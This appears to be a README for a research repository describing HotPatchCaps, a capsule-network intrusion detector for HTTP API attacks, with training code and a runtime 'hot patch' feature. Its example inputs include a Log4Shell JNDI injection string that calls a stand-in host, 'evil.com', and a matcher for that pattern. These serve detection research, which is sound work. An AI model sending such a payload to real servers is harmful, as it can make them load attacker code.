# HotPatchCaps

**A Capsule Network with Runtime Hot Patching for Zero-Day API Attack Detection**

> Implementation accompanying the paper:  
> *"HotPatchCaps: A Capsule Network with Runtime Hot Patching for Zero-Day API Attack Detections"*

---

## Overview

HotPatchCaps is a lightweight intrusion detection model designed for **HTTP API traffic classification**. It combines:

- **Capsule Networks** with dynamic routing for robust multi-class attack detection
- **Lifecycle-derived semantic cues** injected as routing priors — not concatenated with lexical features
- **Runtime Hot Patching** — a zero-downtime mechanism to register new attack patterns (e.g. Log4Shell) *without* retraining the model
- **Unknown detection** via Maximum Softmax Probability (MSP) gating, calibrated on a validation set at a target false-positive rate

### Why Capsule Networks?

Unlike flat softmax classifiers, capsule vectors preserve spatial and structural relationships within the request. The slot-controlled routing layer allows domain knowledge to be injected directly into the routing process, enabling the model to generalize across dataset distributions (e.g. trained on CSIC 2010, tested on ATRDF).

---

## Architecture

```
HTTP Request
     │
     ├─ TF-IDF (1-3gram, L2-norm)
     │        └─> MLP (512→256, ReLU, LayerNorm, Dropout)
     │                └─> Primary Capsules
     │                         └─> SlotControlledCapsuleLayer ──┐
     │                                                           │
     └─ Lifecycle Semantic Cues                                  │
              z-scored on train                                   │
              padded to slot layout                              │
              └─> injected as routing priors ────────────────────┘
                                                                  │
                                                     K Class Capsules
                                                                  │
                                               cos(cap_k, target_k) × temperature
                                                                  │
                                                              Logits [B, K]
```

**Hot Patching** (inference-only, no retraining):
```
new_threat detected
      │
HotPatchManager.add_slot(
    name       = 'Log4Shell',
    matcher_fn = lambda text: 1.0 if '${jndi:' in text.lower() else 0.0,
    alpha      = 0.5,
    w_to_class = [0, 0, 0, 0, 0, 0, 1],   # points to Log4J class capsule
)
```

---

## Directory Structure

```
hotpatchcaps/
├── README.md
├── requirements.txt
└── src/
    ├── models/
    │   ├── capsule_layer.py       # CapsuleLayer, PrimaryCapsLayer, CapsuleNetwork
    │   └── hotpatch_caps.py       # HotPatchCapsModel, HotPatchManager, training loop
    ├── features/
    │   └── expert_features.py     # Lifecycle semantic cue extractor
    └── evaluation/
        └── visualization.py       # Confusion matrix, per-class metrics, t-SNE scatter
```

---

## Installation

```bash
pip install -r requirements.txt
```

Python 3.9+ recommended. GPU optional but accelerates training significantly.

---

## Quick Start

### 1. Prepare your dataset

The model expects a JSON file where each entry has a `request` object:

```json
[
  {
    "request": {
      "method": "GET",
      "url": "/login?user=admin",
      "headers": {"User-Agent": "Mozilla/5.0"},
      "body": "",
      "Attack_Tag": "Benign"
    }
  }
]
```

`Attack_Tag` values determine the class labels. Use `"Benign"` for normal traffic.

### 2. Train

```python
import json, torch
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.preprocessing import StandardScaler
from torch.utils.data import DataLoader

from src.models.hotpatch_caps import (
    HotPatchCapsModel, HotPatchCapsDataset, collate_fn,
    preprocess_example, stratified_split, balanced_sample,
    train_one_epoch, evaluate, calibrate_unknown_threshold,
    TFIDF_MAX_FEATURES, TFIDF_NGRAM_RANGE,
)

# --- Load data ---
with open('dataset_train.json') as f:
    raw = json.load(f)

label_map   = {'Benign': 0, 'SQLi': 1, 'XSS': 2, 'DirTrav': 3,
               'Log4Shell': 4, 'LogForging': 5, 'RCE': 6}
id_to_label = {v: k for k, v in label_map.items()}

examples = [preprocess_example(e, label_map) for e in raw]
examples = balanced_sample(examples, label_map)
train_ex, test_ex = stratified_split(examples, test_size=0.20)
train_ex, val_ex  = stratified_split(train_ex,  test_size=0.15)

# --- Fit TF-IDF and cue scaler on training data only ---
vectorizer = TfidfVectorizer(max_features=TFIDF_MAX_FEATURES,
                             ngram_range=TFIDF_NGRAM_RANGE)
vectorizer.fit([e['text'] for e in train_ex])

import numpy as np
cue_scaler = StandardScaler()
cue_scaler.fit(np.array([e['cue_features'] for e in train_ex], dtype='float32'))

# --- Build datasets ---
train_ds = HotPatchCapsDataset(train_ex, vectorizer, cue_scaler)
val_ds   = HotPatchCapsDataset(val_ex,   vectorizer, cue_scaler)
test_ds  = HotPatchCapsDataset(test_ex,  vectorizer, cue_scaler)

train_loader = DataLoader(train_ds, batch_size=256, shuffle=True,  collate_fn=collate_fn)
val_loader   = DataLoader(val_ds,   batch_size=256, shuffle=False, collate_fn=collate_fn)
test_loader  = DataLoader(test_ds,  batch_size=256, shuffle=False, collate_fn=collate_fn)

# --- Train ---
device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
model  = HotPatchCapsModel(input_dim=TFIDF_MAX_FEATURES, num_labels=len(label_map))
model.to(device)
optimizer = torch.optim.Adam(model.parameters(), lr=1e-3)

for epoch in range(1, 31):
    loss = train_one_epoch(model, train_loader, optimizer, device)
    print(f"Epoch {epoch:2d}  loss={loss:.4f}")

# --- Calibrate unknown threshold ---
tau = calibrate_unknown_threshold(model, val_loader, device, target_fpr=0.01)

# --- Evaluate ---
results = evaluate(model, test_loader, device, id_to_label, tau=tau)
print(f"Accuracy={results['accuracy']:.4f}  F1={results['f1']:.4f}")
```

### 3. Add a hot patch at inference time

```python
from src.models.hotpatch_caps import HotPatchManager, predict_with_hotpatch

mgr = HotPatchManager(num_labels=len(label_map))

# Register a Log4Shell detector
slot_id = mgr.add_slot(
    name       = 'Log4Shell_v1',
    matcher_fn = lambda text: 1.0 if '${jndi:' in text.lower() else 0.0,
    alpha      = 0.5,
    w_to_class = [0, 0, 0, 0, 1, 0, 0],  # index 4 = Log4Shell
)

# Test without committing
print(mgr.dry_run(slot_id, "GET /?x=${jndi:ldap://evil.com/a} HTTP/1.1"))

# Run inference
result = predict_with_hotpatch(
    model, vectorizer, cue_scaler,
    request_data={'method': 'GET', 'url': '/?x=${jndi:ldap://evil.com/a}',
                  'headers': {}, 'body': ''},
    id_to_label=id_to_label,
    hot_patch_mgr=mgr,
    tau=tau,
)
print(result)
# {'prediction': 'Log4Shell', 'confidence': ..., 'fired_patches': ['Log4Shell_v1'], ...}
```

---

## Lifecycle Semantic Cues

A key design choice in HotPatchCaps is that domain knowledge is captured through **lifecycle-derived cues** — features that reflect how different attack types manifest across the full request lifecycle (URL, headers, body, protocol metadata). These cues cover attack families including SQLi, XSS, directory traversal, Log4Shell/JNDI injection, log forging, and remote code execution.

Critically, these cues are **not predefined static priors**. They are extracted per-request at runtime and injected into the capsule routing layer, where the model learns how to weight them during training. This allows the routing process to remain adaptive rather than rule-driven.

The extractor is defined in `src/features/expert_features.py` and can be extended with new signal groups as threat landscapes evolve.

---

## Citation

Coming up soon!

---

## License

This repository is released for research and educational purposes.

---

> **Note**
>
> This repository was reorganized and annotated by an AI agent (Claude) for portfolio demonstration purposes.
> It is a curated and simplified extract of the original research codebase — not the full, original implementation.
> Code structure, comments, and documentation have been edited for clarity and public readability.
> For the authoritative implementation and results, refer to the original paper.
